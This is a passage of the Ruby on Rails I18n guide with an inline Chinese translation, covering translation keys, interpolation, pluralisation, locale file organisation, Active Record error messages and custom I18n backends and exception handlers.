OK! Now you've initialized I18n support for your Ruby on Rails application and told it which locale to use and how to preserve it between requests. With that in place, you're now ready for the really interesting stuff.                                                                                                                                 好了，现在已经为Ruby on Rails程序的国际化支持进行初始化，已经告诉它要使用哪个locale，怎么在请求之间保存laocale。搞定了这些，现在可以准备做真正有趣的事情了。

Let's internationalize our application, i.e. abstract every locale-specific parts, and then localize it, i.e. provide necessary translations for these abstracts.                                                                            开始程序的国际化吧。就是，抽取每个特定需要国际化的部分，进行本地化；也就是，为这些抽取部分提供必要的翻译。

You most probably have something like this in one of your applications:                                           程序里很可能就有下面这些东西：
# config/routes.rb
Yourapp::Application.routes.draw do
  root to: "home#index"
end
# app/controllers/application_controller.rb
class ApplicationController < ActionController::Base
  before_action :set_locale
 
  def set_locale
    I18n.locale = params[:locale] || I18n.default_locale
  end
end
# app/controllers/home_controller.rb
class HomeController < ApplicationController
  def index
    flash[:notice] = "Hello Flash"
  end
end
# app/views/home/index.html.erb
<h1>Hello World</h1>
<p><%= flash[:notice] %></p>

rails i18n demo untranslated
###  3.1 Adding Translations 增加翻译

Obviously there are two strings that are localized to English. In order to internationalize this code, replace these strings with calls to Rails' #t helper with a key that makes sense for the translation:                                                                                                                                         很明显，有两个字符串被本地化为英语。为了国际化这些代码，要将这些字符串替换为Rails的带键#t辅助器，这个键的意思应该表明该翻译的意义。
# app/controllers/home_controller.rb
class HomeController < ApplicationController
  def index
    flash[:notice] = t(:hello_flash)
  end
end
# app/views/home/index.html.erb
<h1><%=t :hello_world %></h1>
<p><%= flash[:notice] %></p>

When you now render this view, it will show an error message which tells you that the translations for the keys :hello_world and :hello_flash are missing.                                                            现在你呈现该视图，会展示一个错误信息，告诉你:hello_world和:hello_flash两个键的翻译缺失了。

rails i18n demo translation missing

Rails adds a t (translate) helper method to your views so that you do not need to spell out I18n.t all the time. Additionally this helper will catch missing translations and wrap the resulting error message into a <span class="translation_missing">. Rails添加了t辅助器方法到视图中，这样你就不需要拼出I18n这个词了。另外这个辅助器将跟踪缺失的翻译，并将错误信息包装到一个 <span class="translation_missing">中。

So let's add the missing translations into the dictionary files (i.e. do the "localization" part):               那就将缺失的翻译增添到字典文件吧（就是本地化部分）
# config/locales/en.yml
en:
  hello_world: Hello world!
  hello_flash: Hello flash!
 
# config/locales/pirate.yml
pirate:
  hello_world: Ahoy World
  hello_flash: Ahoy Flash

There you go. Because you haven't changed the default_locale, I18n will use English. Your application now shows:                                                                                                                      做得好。因为还没有将default_locale改过来，I18n将使用英语。程序现在看起来是这样的：

rails i18n demo translated to English

And when you change the URL to pass the pirate locale (http://localhost:3000?locale=pirate), you'll get:                                                                  当你将URL改为pirate(http://localhost:3000?locale=pirate)，就会看到：

rails i18n demo translated to pirate

You need to restart the server when you add new locale files. 新增新的locale文件时，需要重启服务器。

You may use YAML (.yml) or plain Ruby (.rb) files for storing your translations in SimpleStore.YAML is the preferred option among Rails developers. However, it has one big disadvantage.  YAML is very sensitive to whitespace and special characters, so the application may not load your dictionary properly. Ruby files will crash your application on first request, so you may easily find what's wrong. (If you encounter any "weird issues" with YAML dictionaries, try putting the relevant portion of your dictionary into a Ruby file.)                                                                           你可能使用YAML(.yml)或Ruby(.rb)文件来在SimpleStore保存你的翻译。 YAML是Rails开发这喜欢的选择。不过，它有一个很大的不足。YAML对空格和特定字符极为敏感，所以程序可能不会恰当地导入你的字典。Ruby文件是程序的第一请求，所以你会很容易发现哪里出错。（如果你的YAML字典遇到什么“诡异事件”，可以将词典相关部分转为ruby文件）
###  3.2 Passing variables to translations  将变量传递给翻译

You can use variables in the translation messages and pass their values from the view.                  可以在翻译信息里使用变量，并将它们的值传到视图中。
# app/views/home/index.html.erb
<%=t 'greet_username', user: "Bill", message: "Goodbye" %>
# config/locales/en.yml
en:
  greet_username: "%{message}, %{user}!"
###  3.3 Adding Date/Time Formats  增加日期/时间格式

OK! Now let's add a timestamp to the view, so we can demo the date/time localization feature as well. To localize the time format you pass the Time object to I18n.l or (preferably) use Rails' #l helper. You can pick a format by passing the :format option - by default the :default format is used.                                                                                                                                                  好了！现在增加一个时间戳到视图中，这样可以演示日期/时间的本地特性。为了本地化时间格式，需要传递一个Time对象到I18n.l，或者使用Rails的#l辅助器（大家更喜欢这个）。可以通过传入:format选项挑选一个格式，默认是使用:default格式选项。
# app/views/home/index.html.erb
<h1><%=t :hello_world %></h1>
<p><%= flash[:notice] %></p
<p><%= l Time.now, format: :short %></p>

And in our pirate translations file let's add a time format (it's already there in Rails' defaults for English):                        在pirate翻译文件中，增加一个时间格式（英语的译文已经在Rails默认里了）
# config/locales/pirate.yml
pirate:
  time:
    formats:
      short: "arrrround %H'ish"

So that would give you:            这样它会呈现：

rails i18n demo localized time to pirate

Right now you might need to add some more date/time formats in order to make the I18n backend work as expected (at least for the 'pirate' locale). Of course, there's a great chance that somebody already did all the work by translating Rails' defaults for your locale. See the rails-i18n repository at GitHub for an archive of various locale files. When you put such file(s) in config/locales/ directory, they will automatically be ready for use.                                                                                                                                    现在你可能需要增加更多日期/时间格式，以便让国际化后台如期运作（至少对‘pirate'地区来说）。当然，也是一个便利，有人已经将Rails默认信息全部国际化了。参见，这个作品里面有不少的locale文件。当这样的文件放在config/locales/ 目录中，它们会被自动使用。
###  3.4 Inflection Rules For Other Locales  其他locale的变形规则

Rails allows you to define inflection rules (such as rules for singularization and pluralization) for locales other than English. In config/initializers/inflections.rb, you can define these rules for multiple locales. The initializer contains a default example for specifying additional rules for English; follow that format for other locales as you see fit.                                                                  Rails允许你为英语之外的其他locale定义变形规则（例如单数到复数的规则）。在config/initializers/inflections.rb里，可以为多个locale定义规则。初始化器包含了一个默认的例子来为英语指定额外的规则，模仿这个例子，可以定制其他locale的规则。
###  3.5 Localized Views  本地化视图

Let's say you have a BooksController in your application. Your index action renders content in app/views/books/index.html.erb template. When you put a localized variant of this template: index.es.html.erb in the same directory, Rails will render content in this template, when the locale is set to :es. When the locale is set to the default locale, the generic index.html.erb view will be used. (Future Rails versions may well bring this automagic localization to assets in public, etc.)   现在假如程序里有个BooksController。index动作呈现app/views/books/index.html.erb模板里的内容。当你将模板里的一个本地化变量放到相同目录下的index.es.html.erb，而locale被设置为:es，Rails将呈现该模板的内容。locale被设为默认时，则呈现普通的的index.html.erb。

You can make use of this feature, e.g. when working with a large amount of static content, which would be clumsy to put inside YAML or Ruby dictionaries. Bear in mind, though, that any change you would like to do later to the template must be propagated to all of them.                                    可以利用这个特性，比如当和许多静态内容一起运行时，这些内容放进yaml或ruby词典十分笨拙。记住，稍后模板中任何想做的改变必须插入里面。
###  3.6 Organization of Locale Files  组织本地化文件

When you are using the default SimpleStore shipped with the i18n library, dictionaries are stored in plain-text files on the disc. Putting translations for all parts of your application in one file per locale could be hard to manage. You can store these files in a hierarchy which makes sense to you.        使用默认的i18n库的SimpleStore时，字典存储在目标文本文件里。将一个locale放进一个文件，里面包含程序所有的翻译，这种做法很难管理。可以将这些文件放在一个层级结构里，这样就好看多了。

For example, your config/locales directory could look like this:                                                     比如，把config/locales目录变成这样子：
|-defaults
|---es.rb
|---en.rb
|-models
|---book
|-----es.rb
|-----en.rb
|-views
|---defaults
|-----es.rb
|-----en.rb
|---books
|-----es.rb
|-----en.rb
|---users
|-----es.rb
|-----en.rb
|---navigation
|-----es.rb
|-----en.rb

This way, you can separate model and model attribute names from text inside views, and all of this from the "defaults" (e.g. date and time formats). Other stores for the i18n library could provide different means of such separation.                                                                                                    这种方式可以将每个模型和模型名称从视图的文本中独立处理，以及所有从“默认”带来的东西（比如日期和时间格式）。i18n库的其他存储则提供了这种独立性的其他方式。

The default locale loading mechanism in Rails does not load locale files in nested dictionaries, like we have here. So, for this to work, we must explicitly tell Rails to look further: Rails默认的locale装载机制不会装载这种嵌入字典的locale文件。所以必须明确告诉Rails去寻找其他locale文件。
# config/application.rb
config.i18n.load_path += Dir[Rails.root.join('config', 'locales', '**', '*.{rb,yml}')]

Do check the Rails i18n Wiki for list of tools available for managing translations.                              一定要检查Rails i18n Wiki，里面有管理翻译的工具列表。
##  4 Overview of the I18n API Features  概览国际化API特性

You should have good understanding of using the i18n library now, knowing all necessary aspects of internationalizing a basic Rails application. In the following chapters, we'll cover it's features in more depth.                                                                                                                                       现在你已经理解了怎么使用i18n库了，知道了国际化一个基本程序的必要内容。下面的章节里要讨论深入一点。

These chapters will show examples using both the I18n.translate method as well as the translate view helper method (noting the additional feature provide by the view helper method).    这些章节会显示一个使用I18n.translate方法和translate 视图辅助器方法（视图辅助器方法没有提供额外的特性）的例子。

Covered are features like these:                 所涉及的特性包括。

    looking up translations    查找翻译
    interpolating data into translations     修改翻译的数据
    pluralizing translations                翻译复数
    using safe HTML translations (view helper method only)     使用安全HTML翻译（只用视图辅助器方法）
    localizing dates, numbers, currency, etc.      本地化日期，数字，现金，等等。

###  4.1 Looking up Translations  查找翻译
####  4.1.1 Basic Lookup, Scopes and Nested Keys  基本查找，作用域和嵌入键

Translations are looked up by keys which can be both Symbols or Strings, so these calls are equivalent:                                                                                                                                          通过键可以找到翻译，键可以是字符串，也可以是符号，两者是同等的。
I18n.t :message
I18n.t 'message'

The translate method also takes a :scope option which can contain one or more additional keys that will be used to specify a "namespace" or scope for a translation key:                                        translate方法也带了一个:scope选项，可包含一个或多个额外的键，用以指定翻译键的命名空间或作用域。
I18n.t :record_invalid, scope: [:activerecord, :errors, :messages]

This looks up the :record_invalid message in the Active Record error messages.                        这会在活性记录错误信息里寻找:record_invalid信息。

Additionally, both the key and scopes can be specified as dot-separated keys as in:                         另外，键和作用域可用点号隔开的键的形式来指定。
I18n.translate "activerecord.errors.messages.record_invalid"

Thus the following calls are equivalent:                        因此，下面的调用是一样的：
I18n.t 'activerecord.errors.messages.record_invalid'
I18n.t 'errors.messages.record_invalid', scope: :active_record
I18n.t :record_invalid, scope: 'activerecord.errors.messages'
I18n.t :record_invalid, scope: [:activerecord, :errors, :messages]
####  4.1.2 Defaults  默认选项

When a :default option is given, its value will be returned if the translation is missing:                   指定了:default选项，则翻译缺失的时候返回该值。
I18n.t :missing, default: 'Not here'
# => 'Not here'

If the :default value is a Symbol, it will be used as a key and translated. One can provide multiple values as default. The first one that results in a value will be returned.                                               如果的值是个符号，则该符号将被用作一个键，并进行翻译。可以为默认值提供多个值。第一个返回值的符号将被返回。

E.g., the following first tries to translate the key :missing and then the key :also_missing. As both do not yield a result, the string "Not here" will be returned:                                                       比如，下面将键:missing翻译为:also_missing。但两个都缺失了翻译，所以最后返回一个“Not here”。
I18n.t :missing, default: [:also_missing, 'Not here']
# => 'Not here'
####  4.1.3 Bulk and Namespace Lookup  大量查找和命名空间查找

To look up multiple translations at once, an array of keys can be passed:                                          要同时查找多个翻译，可以传入一个数组的键。
I18n.t [:odd, :even], scope: 'errors.messages'
# => ["must be odd", "must be even"]

Also, a key can translate to a (potentially nested) hash of grouped translations. E.g., one can receive all Active Record error messages as a Hash with:                                                                    键也可被翻译为嵌入式的分组的翻译散列。比如，一个可以接收所有活性记录错误信息散列的例子：
I18n.t 'activerecord.errors.messages'
# => {:inclusion=>"is not included in the list", :exclusion=> ... }
####  4.1.4 "Lazy" Lookup  惰性查找

Rails implements a convenient way to look up the locale inside views. When you have the following dictionary:                                                                                                                                           Rails实现了一个方便的途径来查找视图里的locale。当你有了下面的词典：
es:
  books:
    index:
      title: "Título"

you can look up the books.index.title value inside app/views/books/index.html.erb template like this (note the dot):                                                                                                         可以在app/views/books/index.html.erb模板里面找到books.index.title的值，就像这样（注意点号）：
<%= t '.title' %>

Automatic translation scoping by partial is only available from the translate view helper method. 局部模板作用域的自动翻译只在翻译视图辅助器方法里可用。「译注：什么意思？」
###  4.2 Interpolation  插补翻译

In many cases you want to abstract your translations so that variables can be interpolated into the translation. For this reason the I18n API provides an interpolation feature.                              很多情况下，你需要抽象你的翻译，以便将变量补充进翻译之中。为此I18nAPI提供了一个插补的特性。

All options besides :default and :scope that are passed to #translate will be interpolated to the translation:                                                                                                                                    除了:default和:scope之外的其他传入#translate的选项都被插补在翻译中。
I18n.backend.store_translations :en, thanks: 'Thanks %{name}!'
I18n.translate :thanks, name: 'Jeremy'
# => 'Thanks Jeremy!'

If a translation uses :default or :scope as an interpolation variable, an I18n::ReservedInterpolationKey exception is raised. If a translation expects an interpolation variable, but this has not been passed to #translate, an I18n::MissingInterpolationArgument exception is raised.                                                        如果翻译使用了:default或者:scope作为插补变量，则会抛出I18n::ReservedInterpolationKey异常。如果翻译期待传入插补变量但没传入，则抛出I18n::MissingInterpolationArgument异常。
###  4.3 Pluralization  复数

In English there are only one singular and one plural form for a given string, e.g. "1 message" and "2 messages". Other languages (Arabic, Japanese, Russian and many more) have different grammars that have additional or fewer plural forms. Thus, the I18n API provides a flexible pluralization feature.                                                                                                                          在英语里，每个字符串都有一个单数形式，一个复数形式。比如“1 message”和“2 messages”。其他语言（如阿拉伯语、日本语、俄国语等）则有其他不同的语法或复数形式。因此，I18nAPI提供了一个弹性的复数化特性。

The :count interpolation variable has a special role in that it both is interpolated to the translation and used to pick a pluralization from the translations according to the pluralization rules defined by CLDR:                                                                                                                                                 :count插补变量具有特殊的角色，既可以插补翻译，也可用于根据CLDR定义好复数规则检出复数形式。  「译注：什么是CLDR？」
I18n.backend.store_translations :en, inbox: {
  one: 'one message',
  other: '%{count} messages'
}
I18n.translate :inbox, count: 2
# => '2 messages'
 
I18n.translate :inbox, count: 1
# => 'one message'

The algorithm for pluralizations in :en is as simple as:            :en里复数的运算法则就像那么简单：
entry[count == 1 ? 0 : 1]

I.e. the translation denoted as :one is regarded as singular, the other is used as plural (including the count being zero).                                                                                                                        也就是说，翻译表示:one就是单数，其他的则是复数（包括0个）。

If the lookup for the key does not return a Hash suitable for pluralization, an 18n::InvalidPluralizationData exception is raised.                                                                   如果没有到键对应的适合的复数散列，则抛出18n::InvalidPluralizationData异常。
###  4.4 Setting and Passing a Locale  设置并传递Locale

The locale can be either set pseudo-globally to I18n.locale (which uses Thread.current like, e.g., Time.zone) or can be passed as an option to #translate and #localize.                            locale可以设为伪全局的I18n.locale（使用Thread.current，比如Time.zone），也可以被传到 #translate and #localize作为选项。

If no locale is passed, I18n.locale is used:                 如果没有传入locale，则使用I18n.locale：
I18n.locale = :de
I18n.t :foo
I18n.l Time.now

Explicitly passing a locale:                         明确传入一个locale
I18n.t :foo, locale: :de
I18n.l Time.now, locale: :de

The I18n.locale defaults to I18n.default_locale which defaults to :en. The default locale can be set like this:                                                                                                                                      I18n.default_locale的默认值是:en，这也是I18n.locale默认值。默认的locale可以这样设置：
I18n.default_locale = :de
###  4.5 Using Safe HTML Translations 使用安全HTML翻译

Keys with a '_html' suffix and keys named 'html' are marked as HTML safe. When you use them in views the HTML will not be escaped.                                                                                                 带有_html后缀的键、命名为’html‘的键被标记为HTML安全的。在视图使用它们时，里面的HTML代码将不会被转义。
# config/locales/en.yml
en:
  welcome: <b>welcome!</b>
  hello_html: <b>hello!</b>
  title:
    html: <b>title!</b>
# app/views/home/index.html.erb
<div><%= t('welcome') %></div>
<div><%= raw t('welcome') %></div>
<div><%= t('hello_html') %></div>
<div><%= t('title.html') %></div>

Automatic conversion to HTML safe translate text is only available from the translate view helper method. 自动转化为HTML安全的翻译文本，只在翻译视图辅助器方法中可用。

i18n demo html safe
##  5 How to Store your Custom Translations  怎么存储自定义翻译

The Simple backend shipped with Active Support allows you to store translations in both plain Ruby and YAML format.2                                                                                                                            活性支持自带的Simple后台允许将翻译存在文本的ruby和yaml格式中。

For example a Ruby Hash providing translations can look like this:                                                      比如ruby散列存储的翻译会类似：
{
  pt: {
    foo: {
      bar: "baz"
    }
  }
}

The equivalent YAML file would look like this:               用yaml文件则看起来是这样：
pt:
  foo:
    bar: baz

As you see, in both cases the top level key is the locale. :foo is a namespace key and :bar is the key for the translation "baz".                                                                                                                正如你所见，两种情形中，locale的顶部:foo是个命名空间，而:bar键是翻译"baz"的键。

Here is a "real" example from the Active Support en.yml translations YAML file:                              这是一个真实的例子，来自活性支持的en.yml翻译YAML文件：
en:
  date:
    formats:
      default: "%Y-%m-%d"
      short: "%b %d"
      long: "%B %d, %Y"

So, all of the following equivalent lookups will return the :short date format "%b %d":                     所以，所有下面的相同查找会返回短日期格式"%b %d"。
I18n.t 'date.formats.short'
I18n.t 'formats.short', scope: :date
I18n.t :short, scope: 'date.formats'
I18n.t :short, scope: [:date, :formats]

Generally we recommend using YAML as a format for storing translations. There are cases, though, where you want to store Ruby lambdas as part of your locale data, e.g. for special date formats.                                                                                                                                                一般推荐使用YAML作为存储译文的格式。但在有些情况下想特殊的格式，比如存储ruby的lambdas，作为locale的数据。
###  5.1 Translations for Active Record Models  活性记录模型的翻译

You can use the methods Model.model_name.human and Model.human_attribute_name(attribute) to transparently look up translations for your model and attribute names.                                                                                                                          可以使用Model.model_name.human方法和Model.human_attribute_name(attribute)方法来为模型和属性名称查找翻译。

For example when you add the following translations:                                                                        比如你增加了下面的翻译：
en:
  activerecord:
    models:
      user: Dude
    attributes:
      user:
        login: "Handle"
      # will translate User attribute "login" as "Handle"

Then User.model_name.human will return "Dude" and User.human_attribute_name("login") will return "Handle".                                                                                                            User.model_name.human会返回"Dude"，会User.human_attribute_name("login")返回"Handle"。

You can also set a plural form for model names, adding as following:                                                也可以像下面那样为模型名称设置复数形式。
en:
  activerecord:
    models:
      user:
        one: Dude
        other: Dudes

Then User.model_name.human(count: 2) will return "Dudes". With count: 1 or without params will return "Dude".                        User.model_name.human(count: 2)会返回 "Dudes"，带上 count: 1 或完全不带参数会返回"Dude"。
####  5.1.1 Error Message Scopes  错误信息作用域

Active Record validation error messages can also be translated easily. Active Record gives you a couple of namespaces where you can place your message translations in order to provide different messages and translation for certain models, attributes, and/or validations. It also transparently takes single table inheritance into account.                                                                                         活性记录的验证错误信息也很容易翻译。活性记录给出一组命名空间，将翻译信息放到里面，就可以为模型、属性和或验证提供不同的信息和翻译了。它显然也会单表继承。

This gives you quite powerful means to flexibly adjust your messages to your application's needs.     这是一个强大的方式，可以弹性调整程序所需的信息。

Consider a User model with a validation for the name attribute like this:                                            看看User模型的name属性的验证：
class User < ActiveRecord::Base
  validates :name, presence: true
end

The key for the error message in this case is :blank. Active Record will look up this key in the namespaces:                                                                                                                                       这个情况下错误信息的键是:blank。活性记录将在命名空间中查找这个键：
activerecord.errors.models.[model_name].attributes.[attribute_name]
activerecord.errors.models.[model_name]
activerecord.errors.messages
errors.attributes.[attribute_name]
errors.messages

Thus, in our example it will try the following keys in this order and return the first result:                  因此，这里例子会按顺序尝试下面的键，并返回第一个结果。
activerecord.errors.models.user.attributes.name.blank
activerecord.errors.models.user.blank
activerecord.errors.messages.blank
errors.attributes.name.blank
errors.messages.blank

When your models are additionally using inheritance then the messages are looked up in the inheritance chain.                                                                                                                                模型使用另外的继承时，信息将在继承链中寻找。

For example, you might have an Admin model inheriting from User:                                                 比如，有个Admin模型，继承自User：
class Admin < User
  validates :name, presence: true
end

Then Active Record will look for messages in this order:                                                                    则活性记录将按这个顺序查找信息：
activerecord.errors.models.admin.attributes.name.blank
activerecord.errors.models.admin.blank
activerecord.errors.models.user.attributes.name.blank
activerecord.errors.models.user.blank
activerecord.errors.messages.blank
errors.attributes.name.blank
errors.messages.blank

This way you can provide special translations for various error messages at different points in your models inheritance chain and in the attributes, models, or default scopes.                                        这样，就可以在模型继承链和属性、模型或不同的作用域里的不同的点上为不同的错误信息提供特别的翻译。
####  5.1.2 Error Message Interpolation  错误信息的插补

The translated model name, translated attribute name, and value are always available for interpolation.                                                                                                                                                 翻译模型名称、翻译属性名称和值都可以插补。

So, for example, instead of the default error message "cannot be blank" you could use the attribute name like this : "Please fill in your %{attribute}".                                                那么就，例如可以使用属性名“Please fill in your %{attribute}”，来替换默认的错误信息“cannot be blank”。

    count, where available, can be used for pluralization if present:                                         如果存在计数，可以使用复数形式：

validation
验证
	with option
所带选项
	message
消息
	interpolation
插补
confirmation 	- 	:confirmation 	-
acceptance 	- 	:accepted 	-
presence 	- 	:blank 	-
absence 	- 	:present 	-
length 	:within, :in 	:too_short 	count
length 	:within, :in 	:too_long 	count
length 	:is 	:wrong_length 	count
length 	:minimum 	:too_short 	count
length 	:maximum 	:too_long 	count
uniqueness 	- 	:taken 	-
format 	- 	:invalid 	-
inclusion 	- 	:inclusion 	-
exclusion 	- 	:exclusion 	-
associated 	- 	:invalid 	-
numericality 	- 	:not_a_number 	-
numericality 	:greater_than 	:greater_than 	count
numericality 	:greater_than_or_equal_to 	:greater_than_or_equal_to 	count
numericality 	:equal_to 	:equal_to 	count
numericality 	:less_than 	:less_than 	count
numericality 	:less_than_or_equal_to 	:less_than_or_equal_to 	count
numericality 	:only_integer 	:not_an_integer 	-
numericality 	:odd 	:odd 	-
numericality 	:even 	:even 	-
####  5.1.3 Translations for the Active Record error_messages_for Helper  活性记录`error_messages_for`辅助器的翻译

If you are using the Active Record error_messages_for helper, you will want to add translations for it.                                                                                                                                                   如果使用了活性记录的error_messages_for辅助器，就会想对它进行翻译。

Rails ships with the following translations:                 Rails会使用下面的翻译：
en:
  activerecord:
    errors:
      template:
        header:
          one:   "1 error prohibited this %{model} from being saved"
          other: "%{count} errors prohibited this %{model} from being saved"
        body:    "There were problems with the following fields:"

In order to use this helper, you need to install DynamicForm gem by adding this line to your Gemfile: gem 'dynamic_form'. 为使用这个辅助器，需要在Gemfile里添加gem 'dynamic_form'安装DynamicForm软件包。
###  5.2 Translations for Action Mailer E-Mail Subjects  动作邮箱的电子邮件主题的翻译

If you don't pass a subject to the mail method, Action Mailer will try to find it in your translations. The performed lookup will use the pattern <mailer_scope>.<action_name>.subject to construct the key.                                                                                                                                如果没有传入主题到mail方法，动作邮箱会尝试在翻译中查找。查找会使用模式<mailer_scope>.<action_name>.subject来构建键。
# user_mailer.rb
class UserMailer < ActionMailer::Base
  def welcome(user)
    #...
  end
end
en:
  user_mailer:
    welcome:
      subject: "Welcome to Rails Guides!"
###  5.3 Overview of Other Built-In Methods that Provide I18n Support  概览其他支持国际化的内建方法

Rails uses fixed strings and other localizations, such as format strings and other format information in a couple of helpers. Here's a brief overview.                                                                                    Rails使用固定的字符串和其他本地化，例如在一对辅助器中的格式化的字符串和其他格式信息。下面是简要概览：
####  5.3.1 Action View Helper Methods  动作视图辅助器方法

    distance_of_time_in_words translates and pluralizes its result and interpolates the number of seconds, minutes, hours, and so on. See datetime.distance_in_words translations.                                                                                                                              distance_of_time_in_words将结果进行翻译和复数化，并插补秒数、分钟数、小时数等等。参见datetime.distance_in_words翻译。

    datetime_select and select_month use translated month names for populating the resulting select tag. See date.month_names for translations. datetime_select also looks up the order option from date.order (unless you pass the option explicitly). All date selection helpers translate the prompt using the translations in the datetime.prompts scope if applicable.                                                                                                                           datetime_select 和 select_month使用翻译过的月名放到结果select标签中。参见date.month_names 的翻译。datetime_select也会从date.order查找order选项（除非你显式地传入选项）。所有的日期选择辅助器将使用datetime.prompts 作用域的翻译（如果可用的化）翻译提示。

    The number_to_currency, number_with_precision, number_to_percentage, number_with_delimiter, and number_to_human_size helpers use the number format settings located in the number scope.                                                                                     number_to_currency, number_with_precision, number_to_percentage, number_with_delimiter, 以及  number_to_human_size辅助器使用位于number作用域的数字格式设置。

####  5.3.2 Active Model Methods  活性模型的方法

    model_name.human and human_attribute_name use translations for model names and attribute names if available in the activerecord.models scope. They also support translations for inherited class names (e.g. for use with STI) as explained above in "Error message scopes".                                                                                                                model_name.human和human_attribute_name使用在作用域里的模型名称和属性名称（如果可用）的翻译。也支持继承类名的翻译，正如上面“错误信息作用域”的说明那样。

    ActiveModel::Errors#generate_message (which is used by Active Model validations but may also be used manually) uses model_name.human and human_attribute_name (see above). It also translates the error message and supports translations for inherited class names as explained above in "Error message scopes".                  ActiveModel::Errors#generate_message（活性记录验证所使用，但也有可能被手动使用）使用 model_name.human和 human_attribute_name （参见上面）。也支持继承类名的翻译，正如上面“错误信息作用域”的说明那样。

    ActiveModel::Errors#full_messages prepends the attribute name to the error message using a separator that will be looked up from errors.format (and which defaults to "%{attribute} %{message}"). ActiveModel::Errors#full_messages使用一个从errors.format里找到的分隔符（默认为"%{属性} %{消息}"），将属性名放到错误信息之前。

####  5.3.3 Active Support Methods  活性支持的方法

    Array#to_sentence uses format settings as given in the support.array scope.                  Array#to_sentence使用在 support.array 作用域中指定的格式设置。

##  6 Customize your I18n Setup  自定义国际化设置
###  6.1 Using Different Backends  使用其他后台

For several reasons the Simple backend shipped with Active Support only does the "simplest thing that could possibly work" for Ruby on Rails3 ... which means that it is only guaranteed to work for English and, as a side effect, languages that are very similar to English. Also, the simple backend is only capable of reading translations but cannot dynamically store them to any format.                      因为几个原因，活性支持所带的Simple后台只为Ruby on Rails“做最可能完成的且最简单的事情”，这意味着它只保证在英语环境中，作为副产品，也在和英语类似的语言环境中运行。simple后台只能读取翻译，却不能动态将它们存储了其他格式。

That does not mean you're stuck with these limitations, though. The Ruby I18n gem makes it very easy to exchange the Simple backend implementation with something else that fits better for your needs. E.g. you could exchange it with Globalize's Static backend:                                                  这并不意味着你必须忍受这些限制。RubyI18n软件包使得将Simple后台执行换为其他更适合需要的工具变得容易。比如，换为Globalize的Static后台。
I18n.backend = Globalize::Backend::Static.new

You can also use the Chain backend to chain multiple backends together. This is useful when you want to use standard translations with a Simple backend but store custom application translations in a database or other backends. For example, you could use the Active Record backend and fall back to the (default) Simple backend:                                                                                                 也可以使用Chain后台将多个后台连接在一起。使用Simple后台作为标准翻译，但将自定义程序翻译放到一个数据库或其他后台中，Chain就很有用了。比如，可能会使用活性记录后台，然后退回到默认的Simple后台。
I18n.backend = I18n::Backend::Chain.new(I18n::Backend::ActiveRecord.new, I18n.backend)
###  6.2 Using Different Exception Handlers  使用其他异常处理

The I18n API defines the following exceptions that will be raised by backends when the corresponding unexpected conditions occur:                                                                                        I18n API定义了下面的异常。相应的非预期条件发生时，后台会抛出它们。
MissingTranslationData       # no translation was found for the requested key 请求的键没有找到翻译。
InvalidLocale                # the locale set to I18n.locale is invalid (e.g. nil) I18n.locale没有设置这个locale。
InvalidPluralizationData     # a count option was passed but the translation data is not suitable for pluralization 传入了一个计数选项，但翻译数据不适合变形。
MissingInterpolationArgument # the translation expects an interpolation argument that has not been passed 翻译预期的插补参数没有传入
ReservedInterpolationKey     # the translation contains a reserved interpolation variable name (i.e. one of: scope, default) 翻译包含了一个保留的插补变量名称（比如scope或defalult）
UnknownFileType              # the backend does not know how to handle a file type that was added to I18n.load_path 后台不知道怎么处理一个被添加到I18n.load_path的文件的类型。

The I18n API will catch all of these exceptions when they are thrown in the backend and pass them to the default_exception_handler method. This method will re-raise all exceptions except for MissingTranslationData exceptions. When a MissingTranslationData exception has been caught, it will return the exception's error message string containing the missing key/scope.             I18n API将中捕捉所有这些后台里抛出异常，并传递到default_exception_handler方法。这个方法会再次抛出除了MissingTranslationData之外的其他异常。MissingTranslationData异常被捕捉后，它会返回异常的包含了遗失键/作用域的错误消息字符串。

The reason for this is that during development you'd usually want your views to still render even though a translation is missing.                                                                                                           这么处理的理由是，在开发期间，通常应该让视图呈现出来，即使遗失了翻译。

In other contexts you might want to change this behavior, though. E.g. the default exception handling does not allow to catch missing translations during automated tests easily. For this purpose a different exception handler can be specified. The specified exception handler must be a method on the I18n module or a class with #call method:                                                                 不过，在另一个环境你可能会想改变这个行为。比如，默认的异常处理不允许在简易的自动测试捕捉遗失翻译。这样就要指定另一个异常处理器。该指定的异常处理器必须是I18n模块的一个方法或带有#call方法的类。
module I18n
  class JustRaiseExceptionHandler < ExceptionHandler
    def call(exception, locale, key, options)
      if exception.is_a?(MissingTranslation)
        raise exception.to_exception
      else
        super
      end
    end
  end
end
 
I18n.exception_handler = I18n::JustRaiseExceptionHandler.new

This would re-raise only the MissingTranslationData exception, passing all other input to the default exception handler.                                                                                                                  这只会重新抛出MissingTranslationData异常，并传递其他所有输出到默认的异常处理器中。

However, if you are using I18n::Backend::Pluralization this handler will also raise I18n::MissingTranslationData: translation missing: en.i18n.plural.rule exception that should normally be ignored to fall back to the default pluralization rule for English locale. To avoid this you may use additional check for translation key:                                                                不过，如果你使用I18n::Backend::Pluralization，这个处理器也会抛出I18n::MissingTranslationData: translation missing: en.i18n.plural.rule异常，这个异常通常应该被忽略，以便返回英语locale的默认复数化规则。要避免它，可对翻译键进行额外的检查。
if exception.is_a?(MissingTranslation) && key.to_s != 'i18n.plural.rule'
  raise exception.to_exception
else
  super
end

Another example where the default behavior is less desirable is the Rails TranslationHelper which provides the method #t (as well as #translate). When a MissingTranslationData exception occurs in this context, the helper wraps the message into a span with the CSS class translation_missing.                                                                                                                     默认行为不顺心的另一个例子是Rails翻译辅助器，它提供了方法#t（也叫#translate）。在这个辅助器的环境下抛出MissingTranslationData异常时，这个辅助器将消息包装进了一个带translation_missing类CSS的的span里。

To do so, the helper forces I18n#translate to raise exceptions no matter what exception handler is defined by setting the :raise option:                                                                                              为了做到这一点，该辅助器强制I18n#translate抛出异常，不管通过设置:raise选项定义了什么异常处理器。
I18n.t :foo, raise: true # always re-raises exceptions from the backend 总是重新抛出后台的所有异常。
##  7 Conclusion 总结

At this point you should have a good overview about how I18n support in Ruby on Rails works and are ready to start translating your project.                                                                                           现在应该对Ruby on Rails的国际化支持怎么运行有了很好的了解，可以准备对项目进行国际化了。

If you find anything missing or wrong in this guide, please file a ticket on our issue tracker. If you want to discuss certain portions or have questions, please sign up to our mailing list.                         如果你在这个指南中找到任何遗漏或错误，请在我们的问题追踪系统issue tracker上提上一醒。如果想讨论相关部分或有什么问题，请登录我们的邮件列表mailing list。
##  8 Contributing to Rails I18n  为Rails国际化作出贡献

